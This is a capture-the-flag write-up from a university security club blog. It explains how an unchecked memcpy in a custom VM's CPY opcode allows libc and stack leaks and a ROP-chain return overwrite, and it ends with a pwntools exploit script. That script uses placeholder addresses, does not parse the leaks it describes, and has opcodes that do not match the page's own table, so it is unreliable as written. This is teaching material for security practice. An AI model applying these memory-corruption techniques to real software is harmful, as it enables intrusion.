<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Uninitialized VM</title><meta content="Uninitialized VM" name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/Uninitialized_vm/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content="Uninitialized VM" property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/Uninitialized_vm/ property=twitter:url><meta content="Uninitialized VM" property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/Uninitialized_vm/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>Uninitialized_vm</span></div><time datetime=2025-07-08>Published on: <span class=accent-data>2025-07-08</span></time><address rel=author>By <span class=accent-data> Thirukailash, and exploiitm </span></address><h1>Uninitialized VM</h1><p><strong>Description</strong><p>Just cooked up a simple VM, forgot to check for bugs tho.<h2 id=files-provided><strong>Files provided</strong></h2><pre style=background:#282828;color:#fdf4c1aa><code><span>vm_chall
</span><span>Dockerfile
</span><span>libc.so.6
</span><span>ld-linux-x86-64.so.2
</span><span>flag.txt
</span></code></pre><h2 id=vulnerability>Vulnerability</h2><ul><li><code>CPY</code> opcode uses <code>memcpy()</code> with attacker-controlled size and indices.<li>No bounds checks → memory corruption.<li>Can copy data <em>into and out of</em> the VM stack and manipulate key structures.</ul><hr><h2 id=key-opcodes-for-exploit>Key Opcodes for exploit</h2><table><thead><tr><th>Opcode<th>Meaning<tbody><tr><td><code>0x36</code><td><code>CPY</code> (vuln here)<tr><td><code>0x31</code><td><code>PUSH</code><tr><td><code>0x32</code><td><code>PUSH_R</code><tr><td><code>0x33</code><td><code>POP_R</code><tr><td><code>0x35</code><td><code>MOV_R_X</code><tr><td><code>0x44</code><td><code>SUB</code><tr><td><code>0x43</code><td><code>ADD</code></table><hr><h2 id=exploit-summary>Exploit summary</h2><p>The vulnerability lies in a broken VM instruction: <strong><code>CPY</code></strong>, which uses <code>memcpy()</code> without bounds checking. This gives us <strong>out-of-bounds memory read/write</strong> from within the VM.<hr><h3 id=step-1-copy-regs-struct-to-vm-stack>Step 1: Copy <code>regs</code> Struct to VM Stack</h3><ul><li>Use the vulnerable <code>CPY</code> instruction to copy the <code>regs</code> struct onto the VM’s stack.<li>Modify register values (<code>sp</code>, <code>bp</code>, <code>pc</code>, etc.) using VM instructions like <code>ADD</code>, <code>SUB</code>, <code>MOV</code>, etc.<li>These modifications are possible because the VM allows arithmetic on its stack contents.</ul><hr><h3 id=step-2-regain-control-over-vm-stack>Step 2: Regain Control Over VM Stack</h3><ul><li>After editing the copied <code>regs</code>, copy it back into its original location using <code>CPY</code>.<li>This gives full control over the VM’s: <ul><li><strong>Stack pointer (<code>sp</code>)</strong><li><strong>Base pointer (<code>bp</code>)</strong><li><strong>Program counter (<code>pc</code>)</strong></ul><li>Now we can use VM opcodes like <code>PUSH</code>, <code>POP</code>, and <code>CPY</code> to read/write arbitrary memory.</ul><hr><h3 id=step-3-leak-libc-via-heap-metadata>Step 3: Leak libc via Heap Metadata</h3><ul><li>The <code>expand()</code> function frees the old memory chunks and reallocates them.<li>Freed chunks leave <strong>unsorted bin metadata</strong> (heap freelist pointers) in memory.<li>Use VM stack read to extract those pointers → gives a <strong>libc leak</strong>.</ul><hr><h3 id=step-4-leak-stack-address-via-environ>Step 4: Leak Stack Address via <code>environ</code></h3><ul><li>Use leaked libc base to compute the address of <code>environ</code>.<li><code>environ</code> holds a pointer to the actual stack top.<li>Copy <code>environ</code> to the VM stack, then use <code>POP_R</code> to load it into a VM register.</ul><hr><h3 id=step-5-stack-pivot-return-address-overwrite>Step 5: Stack Pivot + Return Address Overwrite</h3><p>Now that we know the real stack address:<ul><li>Set the VM stack to overlap the <strong>main() function’s stack frame</strong>.<li>Push a <strong>ROP chain</strong> onto the return address using the VM’s <code>PUSH</code> opcode.<li>When execution returns from main, it hits our payload.</ul><hr><h2 id=final-exploit-script>Final Exploit Script</h2><p>The following Python script uses <code>pwntools</code> to exploit the Uninitialized VM by triggering an out-of-bounds <code>memcpy</code>, leaking <code>libc</code> and <code>stack</code>, and hijacking control flow.<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=font-style:italic;color:#928374>#!/usr/bin/env python3
</span><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
</span><span>
</span><span>context.binary </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ELF(</span><span style=color:#b8bb26>"./vm_chall"</span><span style=color:#fdf4c1>)
</span><span>libc </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ELF(</span><span style=color:#b8bb26>"./libc.so.6"</span><span style=color:#fdf4c1>)
</span><span>context.terminal </span><span style=color:#fe8019>= </span><span>[</span><span style=color:#b8bb26>"tmux"</span><span>, </span><span style=color:#b8bb26>"splitw"</span><span>, </span><span style=color:#b8bb26>"-h"</span><span>]
</span><span>context.log_level </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"debug"
</span><span>
</span><span style=font-style:italic;color:#928374># Start the target process or connect remotely
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>launch</span><span>():
</span><span>    </span><span style=color:#fa5c4b>if </span><span>args.</span><span style=color:#fdf4c1>REMOTE</span><span>:
</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>remote(</span><span style=color:#b8bb26>"host"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>1337</span><span style=color:#fdf4c1>)  </span><span style=font-style:italic;color:#928374># Replace with actual host/port
</span><span>    </span><span style=color:#fa5c4b>elif </span><span>args.</span><span style=color:#fdf4c1>GDB</span><span>:
</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>gdb.debug(</span><span style=color:#b8bb26>"./vm_chall"</span><span style=color:#fdf4c1>, gdbscript</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>"""
</span><span style=color:#b8bb26>            break *main+1695
</span><span style=color:#b8bb26>            continue
</span><span style=color:#b8bb26>        """</span><span style=color:#fdf4c1>)
</span><span>    </span><span style=color:#fa5c4b>else</span><span>:
</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>process(</span><span style=color:#b8bb26>"./vm_chall"</span><span style=color:#fdf4c1>)
</span><span>
</span><span style=font-style:italic;color:#928374># Short helpers to emit bytecode for each instruction
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>b</span><span>(</span><span style=color:#fdf4c1>x</span><span>): </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>p8(x)
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>reg</span><span>(</span><span style=color:#fdf4c1>r</span><span>): </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>b(r </span><span style=color:#fe8019>& </span><span style=color:#d3869b>7</span><span style=color:#fdf4c1>)
</span><span>
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>op_push_imm</span><span>(</span><span style=color:#fdf4c1>val</span><span>): </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>b(</span><span style=color:#d3869b>0x35</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>reg(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(val)
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>op_push</span><span>(</span><span style=color:#fdf4c1>val</span><span>): </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>b(</span><span style=color:#d3869b>0x31</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>b(val)
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>op_push_r</span><span>(</span><span style=color:#fdf4c1>r</span><span>): </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>b(</span><span style=color:#d3869b>0x32</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>reg(r)
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>op_pop_r</span><span>(</span><span style=color:#fdf4c1>r</span><span>): </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>b(</span><span style=color:#d3869b>0x33</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>reg(r)
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>op_mov</span><span>(</span><span style=color:#fdf4c1>dst</span><span>, </span><span style=color:#fdf4c1>src</span><span>): </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>b(</span><span style=color:#d3869b>0x34</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>reg(dst) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>reg(src)
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>op_cpy</span><span>(</span><span style=color:#fdf4c1>dst_r</span><span>, </span><span style=color:#fdf4c1>src_r</span><span>, </span><span style=color:#fdf4c1>size</span><span>): </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>b(</span><span style=color:#d3869b>0x36</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>reg(dst_r) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>reg(src_r) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>b(size) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>b(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>* </span><span style=color:#d3869b>2  </span><span style=font-style:italic;color:#928374># pad to skip PC += 3
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>op_add</span><span>(</span><span style=color:#fdf4c1>r1</span><span>, </span><span style=color:#fdf4c1>r2</span><span>): </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>b(</span><span style=color:#d3869b>0x43</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>reg(r1) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>reg(r2)
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>op_and</span><span>(</span><span style=color:#fdf4c1>r1</span><span>, </span><span style=color:#fdf4c1>r2</span><span>): </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>b(</span><span style=color:#d3869b>0x38</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>reg(r1) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>reg(r2)
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>op_not</span><span>(</span><span style=color:#fdf4c1>r</span><span>): </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>b(</span><span style=color:#d3869b>0x40</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>reg(r)
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>op_jmp</span><span>(</span><span style=color:#fdf4c1>offset</span><span>): </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>b(</span><span style=color:#d3869b>0x45</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>b(offset)
</span><span>
</span><span style=font-style:italic;color:#928374># Construct the payload
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>build_payload</span><span>():
</span><span>    payload </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>''
</span><span>
</span><span>    </span><span style=font-style:italic;color:#928374># Step 1: Fill stack space to operate on
</span><span>    </span><span style=color:#fa5c4b>for </span><span style=color:#fdf4c1>_ </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>range</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>)</span><span>:
</span><span>        payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>op_push(</span><span style=color:#d3869b>0x00</span><span style=color:#fdf4c1>)
</span><span>
</span><span>    </span><span style=font-style:italic;color:#928374># Step 2: Copy `regs` struct to VM stack 
</span><span>    payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>op_push_imm(</span><span style=color:#d3869b>0xef</span><span style=color:#fdf4c1>)
</span><span>    payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>op_push_imm(</span><span style=color:#d3869b>0xff</span><span style=color:#fdf4c1>)
</span><span>    payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>op_mov(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>)     </span><span style=font-style:italic;color:#928374># r0 = 0xef
</span><span>    payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>op_mov(</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)     </span><span style=font-style:italic;color:#928374># r1 = 0xff
</span><span>    payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>op_cpy(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0x80</span><span style=color:#fdf4c1>)
</span><span>
</span><span>    </span><span style=font-style:italic;color:#928374># Step 3: Prepare modified `regs` on stack (e.g., set new PC/sp/bp)
</span><span>    payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>op_pop_r(</span><span style=color:#d3869b>3</span><span style=color:#fdf4c1>)      </span><span style=font-style:italic;color:#928374># Assume r3 = heap libc ptr
</span><span>    payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>op_pop_r(</span><span style=color:#d3869b>4</span><span style=color:#fdf4c1>)      </span><span style=font-style:italic;color:#928374># r4 = PC
</span><span>    payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>op_push_imm(</span><span style=color:#d3869b>0x12345678</span><span style=color:#fdf4c1>)  </span><span style=font-style:italic;color:#928374># Replace with address of environ or main stack
</span><span>    payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>op_pop_r(</span><span style=color:#d3869b>5</span><span style=color:#fdf4c1>)      </span><span style=font-style:italic;color:#928374># r5 = stack base
</span><span>    payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>op_push_imm(</span><span style=color:#d3869b>0xffffffffffffffff</span><span style=color:#fdf4c1>)
</span><span>    payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>op_pop_r(</span><span style=color:#d3869b>6</span><span style=color:#fdf4c1>)      </span><span style=font-style:italic;color:#928374># r6 = end marker
</span><span>    payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>op_cpy(</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0x80</span><span style=color:#fdf4c1>)  </span><span style=font-style:italic;color:#928374># Copy back regs
</span><span>
</span><span>    </span><span style=font-style:italic;color:#928374># Step 4: Stack pivot → target real stack
</span><span>    payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>op_push_imm(</span><span style=color:#d3869b>0xdeadbeefcafebabe</span><span style=color:#fdf4c1>)  </span><span style=font-style:italic;color:#928374># one_gadget or ret address
</span><span>    </span><span style=color:#fa5c4b>for </span><span style=color:#fdf4c1>_ </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>range</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>3</span><span style=color:#fdf4c1>)</span><span>:
</span><span>        payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>op_push(</span><span style=color:#d3869b>0x00</span><span style=color:#fdf4c1>)
</span><span>
</span><span>    </span><span style=color:#fa5c4b>return </span><span>payload
</span><span>
</span><span style=font-style:italic;color:#928374># Main
</span><span>io </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>launch()
</span><span>
</span><span style=font-style:italic;color:#928374># Initial VM prompt sequence
</span><span style=color:#fa5c4b>for </span><span style=color:#fdf4c1>_ </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>range</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>2</span><span style=color:#fdf4c1>)</span><span>:
</span><span>    </span><span style=color:#fdf4c1>io.sendlineafter(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"[ lEn? ] >> "</span><span style=color:#fdf4c1>, </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"1"</span><span style=color:#fdf4c1>)
</span><span>    </span><span style=color:#fdf4c1>io.sendlineafter(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"[ BYTECODE ] >>"</span><span style=color:#fdf4c1>, </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"a"</span><span style=color:#fdf4c1>)
</span><span>
</span><span style=font-style:italic;color:#928374># Final exploit payload
</span><span>bytecode </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>build_payload()
</span><span style=color:#fa5c4b>assert </span><span style=color:#fabd2f>len</span><span style=color:#fdf4c1>(bytecode) </span><span style=color:#fe8019>< </span><span style=color:#d3869b>256
</span><span>
</span><span style=color:#fdf4c1>io.sendlineafter(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"[ lEn? ] >> "</span><span style=color:#fdf4c1>, </span><span style=color:#fabd2f>str</span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>len</span><span style=color:#fdf4c1>(bytecode)).encode())
</span><span style=color:#fdf4c1>io.sendlineafter(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"[ BYTECODE ] >>"</span><span style=color:#fdf4c1>, bytecode)
</span><span style=color:#fdf4c1>io.interactive()
</span><span>
</span></code></pre><p>This challenge was a great learning experience. I gained a deeper understanding of custom VM environments, memory layout manipulation, and struct-based exploitation. Thanks to the bi0sCTF team for such an excellent problem.<p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>